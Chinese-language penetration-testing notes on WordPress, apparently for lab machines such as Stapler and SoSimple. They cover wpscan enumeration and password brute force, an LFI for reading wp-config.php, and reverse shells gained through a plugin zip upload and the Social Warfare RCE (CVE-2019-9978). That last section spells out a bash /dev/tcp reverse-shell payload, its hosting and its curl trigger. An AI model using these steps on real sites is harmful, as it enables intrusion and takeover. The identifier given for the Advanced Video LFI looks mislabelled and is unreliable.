# WordPress 漏洞利用與安全測試 (wordpress)
本文件整理針對 WordPress CMS 的偵察、漏洞利用與 Web Shell 寫入的手法。

## 🔍 Wpscan 漏洞與使用者列舉
使用 wpscan 對 WordPress 進行安全性掃描、使用者列舉以及密碼爆破。

> [!tip] **強制掃描參數**
> 若目標 WordPress 架設在非標準子目錄下，或因偵測限制導致 wpscan 預設拒絕掃描時，需加上 `--force` 參數以強制執行掃描。

```bash
# 1. 進行外掛與漏洞掃描 (忽略 SSL，若被阻擋可加 --force)
wpscan --url https://<target-ip>/blog/ -e ap --plugins-detection aggressive --force --disable-tls-checks

# 2. 進行使用者列舉 (User Enumeration，若被阻擋可加 --force)
wpscan --url https://<target-ip>/blog/ -e u --force --disable-tls-checks

# 3. 針對列舉出的使用者進行密碼暴力破解
wpscan --url https://<target-ip>/blog/ --usernames john,peter --passwords /usr/share/wordlists/rockyou.txt
```

## 💥 LFI 本地檔案包含
若所使用的外掛存在本地檔案包含漏洞（例如 Advanced Video 1.0 外掛的 CVE-2016-39646），可讀取關鍵設定檔（如 `wp-config.php`）獲取資料庫 root 密碼。

## 💥 後台 ZIP 外掛上傳提權
登入管理後台後，若擁有外掛安裝權限，可將 PHP Reverse Shell 檔案打包為 `.zip`，於 `Plugins > Add New > Upload Plugin` 功能中上傳。隨後存取其上傳路徑即可獲得反彈 Shell。

## 💥 Social Warfare 遠端代碼執行 (CVE-2019-9978)
當 WordPress 啟用舊版 `Social Warfare` 外掛（< 3.5.3）時，可利用其 `swp_url` 參數載入攻擊者託管的惡意 PHP 程式碼，實現遠端任意代碼執行 (RCE)。

### 🛠️ 利用方法
1.  **在攻擊機上準備 payload 檔案**（例如 `shell.txt`）：
    ```php
    <pre>system('bash -c "bash -i >& /dev/tcp/<KALI_IP>/<PORT> 0>&1"')</pre>
    ```
2.  **開啟簡易 HTTP 服務** 供目標主機讀取：
    ```bash
    python3 -m http.server 8000
    ```
3.  **攻擊機端開啟監聽**：
    ```bash
    nc -lvnp <PORT>
    ```
4.  **觸發 RCE 漏洞**（向 `admin-post.php` 接口傳入惡意 payload 連結）：
    ```bash
    curl "http://<target-ip>/wp-admin/admin-post.php?swp_url=http://<KALI_IP>:8000/shell.txt"
    ```

---

# 實戰關聯
*   **靶機應用實例**：
    *   [[Stapler]] (利用 LFI 與外掛上傳提權)
    *   [[SoSimple]] (利用 Social Warfare 遠端代碼執行)
